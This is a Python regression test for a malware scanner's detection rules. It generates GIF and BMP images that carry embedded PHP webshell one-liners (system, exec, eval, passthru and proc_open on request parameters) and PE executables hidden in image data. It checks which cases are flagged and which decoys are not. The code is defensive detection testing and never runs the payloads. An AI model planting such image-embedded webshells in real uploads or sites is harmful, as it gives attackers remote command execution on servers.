#!/usr/bin/env python3
"""Check GIF identity and embedded PHP classification without executing payloads."""
import json
import os
from pathlib import Path
import subprocess
import struct
import tempfile

ROOT = Path(__file__).resolve().parents[2]
MAGIC = 'metadata/file/magic/identity::gif-magic-header'
TAG = 'micro-behaviors/data/embedded/payload/media::php-open-tag-in-media'
CALL = 'micro-behaviors/data/embedded/payload/media::php-request-command-call'
PIPE = 'micro-behaviors/data/embedded/payload/media::php-request-pipe-command-call'
COMMAND = 'objectives/command-and-control/backdoor/webshell/command::media-php-request-command-webshell'
EVAL = 'objectives/command-and-control/backdoor/webshell/eval::media-php-request-eval-webshell'
OLD = 'objectives/command-and-control/backdoor/webshell/exec::media-php-command-webshell'
BASE = bytes.fromhex('47494638396101000100800000000000ffffff2c00000000010001000002024401003b')


def comment(payload):
    blocks = b''.join(bytes([len(payload[i:i + 255])]) + payload[i:i + 255]
                      for i in range(0, len(payload), 255))
    return BASE[:19] + b'\x21\xfe' + blocks + b'\0' + BASE[19:]


def objects(text):
    decoder = json.JSONDecoder()
    offset = 0
    while offset < len(text):
        while offset < len(text) and text[offset].isspace():
            offset += 1
        if offset == len(text):
            break
        value, offset = decoder.raw_decode(text, offset)
        yield value


def main():
    cases = {}

    def add(name, data, required=(), forbidden=(), no_hostile=False):
        cases[name] = data, set(required), set(forbidden), no_hostile

    add('fake-prefix.gif', b'GIF89a\n<?php system($_POST["task"]); ?>',
        ['objectives/command-and-control/backdoor/webshell/embedded::gif-prefixed-php-command-webshell',
         'objectives/evasion/masquerade/extension-mismatch::gif-prefixed-php-as-image'])
    add('ordinary89.gif', BASE, [MAGIC], no_hostile=True)
    add('ordinary87.gif', b'GIF87a' + BASE[6:], [MAGIC], no_hostile=True)
    add('short-header.gif', b'GIF89a', no_hostile=True)
    add('non-gif.gif', b'GIF80a, not a GIF header', forbidden=[MAGIC], no_hostile=True)
    add('magic-not-at-start.txt', b'Example signature: GIF89a', forbidden=[MAGIC], no_hostile=True)
    add('literal-php-tag.gif', comment(b'Tutorial tag: <?php'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('php-tag-suffix.gif', comment(b'<?phpNotCode system($_GET["cmd"]); ?>'), forbidden=[TAG, CALL, COMMAND], no_hostile=True)
    for tag in (b'<?php ', b'<?PHP\n', b'<?='):
        suffix = {b'<?php ': 'long', b'<?PHP\n': 'uppercase', b'<?=': 'echo'}[tag]
        for function in (b'system', b'shell_exec', b'exec', b'passthru', b'popen', b'proc_open'):
            extra = {b'popen': b', "r"', b'proc_open': b', [], $pipes'}.get(function, b'')
            payload = tag + function + b'($_REQUEST["task"]' + extra + b'); ?>'
            add(f'{suffix}-{function.decode()}.gif', comment(payload), [TAG, CALL if function in (b'system', b'shell_exec', b'exec') else PIPE, COMMAND])
        add(f'{suffix}-eval.gif', comment(tag + b'eval($_POST["code"]); ?>'), [TAG, EVAL])
        add(f'{suffix}-quoted-command.gif', comment(tag + b'''echo 'system($_GET["cmd"]);'; ?>'''), forbidden=[CALL, COMMAND], no_hostile=True)
        add(f'{suffix}-quoted-eval.gif', comment(tag + b'''echo 'eval($_POST["code"]);'; ?>'''), forbidden=[EVAL], no_hostile=True)
        add(f'{suffix}-unrelated.gif', comment(tag + b'$mode=$_GET["mode"]; system("date"); ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
        add(f'{suffix}-block-comment.gif', comment(tag + b'/* system($_GET["cmd"]); */ echo 1; ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
        add(f'{suffix}-closed.gif', comment(tag + b'echo 1; ?> system($_GET["cmd"]);'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('double-quoted-command.gif', comment(b'''<?php echo "system($_GET['cmd']);"; ?>'''), forbidden=[CALL, COMMAND], no_hostile=True)
    add('nowdoc-command.gif', comment(b"<?php echo <<<'HELP'\nsystem($_GET[\"cmd\"]);\nHELP;\n?>"), forbidden=[CALL, COMMAND], no_hostile=True)
    add('later-block.gif', comment(b"<?php echo 'system($_GET[\"cmd\"]);'; ?><?php system($_POST[\"cmd\"]); ?>"), [CALL, COMMAND])
    add('assertion.gif', comment(b'<?php assert($_POST["token"]); ?>'), forbidden=[EVAL], no_hostile=True)
    add('method-call.gif', comment(b'<?php $object->system($_GET["task"]); ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('static-method-call.gif', comment(b'<?php Type::system($_GET["task"]); ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('second-argument.gif', comment(b'<?php system("date", $_GET["task"]); ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('namespaced-call.gif', comment(b'<?php namespace Local; system($_GET["task"]); ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('global-qualified-call.gif', comment(b'<?php \\system($_GET["task"]); ?>'), [CALL, COMMAND])
    add('mixed-case-function.gif', comment(b'<?PHP SyStEm($_GET["task"]); ?>'), [CALL, COMMAND])
    add('lowercase-request.gif', comment(b'<?php system($_request["task"]); ?>'), forbidden=[CALL, COMMAND], no_hostile=True)
    add('quoted-eval-appended.gif', BASE + b"<?php echo 'eval($_POST[\"code\"]);'; ?>", forbidden=[EVAL], no_hostile=True)
    add('late-command.gif', BASE + b'<?php /*' + b'x' * 600 + b'*/ system($_POST["task"]); ?>', [CALL, COMMAND])
    add('after-comment.gif', comment(b'<?php /* safely skip this */ system($_COOKIE["task"]); ?>'), [CALL, COMMAND])
    add('after-line-comment.gif', comment(b'<?php // sample note\nsystem($_GET["task"]); ?>'), [CALL, COMMAND])
    add('after-quoted-string.gif', comment(b'''<?php $label='status'; system($_POST["task"]); ?>'''), [CALL, COMMAND])
    add('appended-php.gif', BASE + b'<?php system($_POST["command"]); ?>', [CALL, COMMAND])
    add('comment-mz.gif', comment(b'MZ'), [MAGIC], no_hostile=True)
    add('appended-mz.gif', BASE + b'MZ', [MAGIC], no_hostile=True)
    pe = bytearray(512)
    pe[:2] = b'MZ'
    struct.pack_into('<I', pe, 0x3c, 0x80)
    pe[0x80:0x84] = b'PE\0\0'
    stowaway = 'metadata/file/format/media::media-stowaway-executable'
    add('comment-pe.gif', comment(pe), [stowaway], no_hostile=True)
    add('appended-pe.gif', BASE + pe, [stowaway], no_hostile=True)
    bmp = (struct.pack('<2sIHHI', b'BM', 58, 0, 0, 54)
           + struct.pack('<IiiHHIIiiII', 40, 1, 1, 1, 24, 0, 4, 0, 0, 0, 0)
           + b'\0' * 4)
    add('bmp-php.bmp', bmp + b'<?php system($_POST["task"]); ?>', [TAG, CALL, COMMAND])
    with tempfile.TemporaryDirectory(prefix='gif-improve-') as temp:
        paths = []
        for name, (data, *_rest) in cases.items():
            path = Path(temp) / name
            path.write_bytes(data)
            paths.append(str(path))
        if atomscan := os.environ.get('ATOMSCAN'):
            command = [atomscan, '--no-update', '--analyze', 'local', '--follow=none',
                       '--mode', 'slow', '--format=json', *paths]
        else:
            command = [os.environ.get('CLEAVE', str(ROOT.parent / 'cleave/target/release/cleave')),
                       '--traits-dir', str(ROOT), '--format=json', *paths]
        env = dict(os.environ, CLEAVE_TRAITS_DIR=str(ROOT), SCAN_NO_ANALYSIS_CACHE='1',
                   FILEFACTS_CACHE='0', STNG_STRING_CACHE='0', CLEAVE_SKIP_CACHE='1')
        result = subprocess.run(command, capture_output=True, text=True, env=env)
        if result.returncode not in ((0, 1) if atomscan else (0,)):
            raise RuntimeError(result.stderr)
        if output := os.environ.get('GIF_IMPROVE_REPORT'):
            Path(output).write_text(result.stdout)
        observed = {}
        for report in objects(result.stdout):
            for item in report.get('raw', report)['files']:
                observed.setdefault(Path(item['path']).name, []).extend(item.get('traits', []))
        failures = []
        for name, (_data, required, forbidden, no_hostile) in cases.items():
            traits = observed.get(name, [])
            ids = {t['id'] for t in traits}
            hostile = {t['id'] for t in traits if t['crit'] == 5}
            if name not in observed or required - ids or forbidden & ids or OLD in ids or no_hostile and hostile:
                failures.append({'case': name, 'missing': sorted(required - ids),
                                 'unexpected': sorted(forbidden & ids), 'retired_rule': OLD in ids,
                                 'hostile': sorted(hostile) if no_hostile else []})
        assert not failures, json.dumps(failures, indent=2)
    print(f'GIF improvement regressions passed: {len(cases)} cases')


if __name__ == '__main__':
    main()
